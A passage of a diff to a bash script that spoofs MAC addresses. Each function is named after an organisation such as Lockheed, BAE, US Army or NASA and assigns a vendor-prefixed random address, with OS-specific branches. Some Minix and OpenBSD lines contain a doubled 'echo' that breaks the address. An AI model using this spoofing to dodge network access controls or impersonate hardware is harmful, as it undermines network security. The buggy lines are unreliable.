 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2268,25 +3192,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 00:50:93:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2299,7 +3256,12 @@ _lockheed(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2313,7 +3275,7 @@ else
 printf "$WHITE Lockheed :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 00:07:EF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2328,25 +3290,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 00:07:EF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo 00:07:EF:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2358,7 +3353,11 @@ _airbus(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2372,7 +3371,7 @@ else
 printf "$WHITE Airbus :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 00:23:B9:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2387,25 +3386,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 00:23:B9:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo 00:23:B9:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2417,7 +3449,11 @@ _northrop(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2431,7 +3467,7 @@ else
 printf "$WHITE Northrop :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 00:19:8A:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2445,25 +3481,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 00:19:8A:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo 00:19:8A:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2475,7 +3544,11 @@ _bae(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2489,7 +3562,7 @@ else
 printf "$WHITE BAE :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo CC:3F:EA:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2504,25 +3577,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo CC:3F:EA:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo CC:3F:EA:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2534,7 +3640,11 @@ _us_army(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2548,7 +3658,7 @@ else
 printf "$WHITE US Army  :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 00:C0:ED:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2562,25 +3672,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 00:C0:ED:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo 00:C0:ED:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2593,7 +3736,11 @@ _toyota(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2607,7 +3754,7 @@ else
 printf "$WHITE Toyota :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 00:0A:AB:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2621,25 +3768,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 00:0A:AB:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo 00:0A:AB:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2652,7 +3832,11 @@ _porsche(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2666,7 +3850,7 @@ else
 printf "$WHITE Porsche :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo D0:0E:A4:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2680,25 +3864,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo D0:0E:A4:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
 
   ifconfig em0 lladdr $(echo echo D0:0E:A4:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2712,7 +3929,11 @@ _parrot(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2726,7 +3947,7 @@ else
 printf "$WHITE Parrot :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2741,25 +3962,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo A0:14:3D:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then  #tw
 
   ifconfig em0 lladdr $(echo echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2771,7 +4025,11 @@ _nasa(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then  #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -2785,7 +4043,7 @@ else
 printf "$WHITE NASA :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then  #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo 00:08:55:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -2799,25 +4057,58 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
 elif [[ $_system == "Haiku" ]]; then
 
-  printf "Not supported yet\n"
+  printf "$RED Not supported yet$NC\n"
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Minix" ]]; then  #nn
 
   sudo ip link set dev enp0s3 down
   sudo ip link set dev enp0s3 address $(echo echo 00:08:55:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
   sudo ip link set dev enp0s3 up
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then  #tw
 
   ifconfig em0 lladdr $(echo echo 00:08:55:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
 
+
+  elif [[ $_system == "SunOS" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
+  elif [[ $_system == "OS/390" ]]; then
+
+    printf "$RED Not supported yet$NC\n"
+
 else
 
- printf "Not available on this system\n"
+ printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -2967,57 +4258,65 @@ _exec(){ #selfi
 
     _system="$(uname -s)"
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "Darwin" ]; then #tw
     sudo chmod +x snake
     sudo cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "Linux" ]]; then
+  elif [[ $_system == "Linux" ]]; then #tw
     sudo chmod +x snake
     sudo cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "GNU" ]]; then
+  elif [[ $_system == "GNU" ]]; then #tw
     su
     chmod +x snake
     cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "Haiku" ]]; then
+  elif [[ $_system == "Haiku" ]]; then #tw
     chmod +x snake
-    #sudo cp snake /usr/local/bin/
+    #cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "HP-UX" ]]; then
+  elif [[ $_system == "HP-UX" ]]; then #tw
     sudo chmod +x snake
     sudo cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "Minix" ]]; then
+  elif [[ $_system == "Minix" ]]; then #nn
     chmod +x snake
     cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "OpenBSD" ]]; then
+  elif [[ $_system == "OpenBSD" ]]; then #nn
     sudo chmod +x snake
     sudo cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "SunOS" ]]; then
+  elif [[ $_system == "SunOS" ]]; then #nn
     sudo chmod +x snake
     sudo cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then #nn
     sudo chmod +x snake
     sudo cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
     sudo chmod +x snake
     sudo cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then #nn
     sudo chmod +x snake
     sudo cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
-  elif [[ $_system == "OS/390" ]]; then
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
+    sudo chmod +x snake
+    sudo cp snake /usr/local/bin/
+    printf "$RED _nested$NC \n"
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then #nn
+    sudo chmod +x snake
+    sudo cp snake /usr/local/bin/
+    printf "$RED _nested$NC \n"
+  elif [[ $_system == "OS/390" ]]; then #nn
     sudo chmod +x snake
     sudo cp snake /usr/local/bin/
     printf "$RED _nested$NC \n"
   else
-     printf "$RED Not supported default$NC\n"
+     printf "$RED Not supported sys$NC\n"
   fi
 
 }
@@ -3153,13 +4452,33 @@ _exec_b(){ #selfi
 
       printf "$RED Not supported yet$NC\n"
 
+    elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+      printf "$RED Not supported yet$NC\n"
+
+    elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+      printf "$RED Not supported yet$NC\n"
+
+    elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+      printf "$RED Not supported yet$NC\n"
+
+    elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+      printf "$RED Not supported yet$NC\n"
+
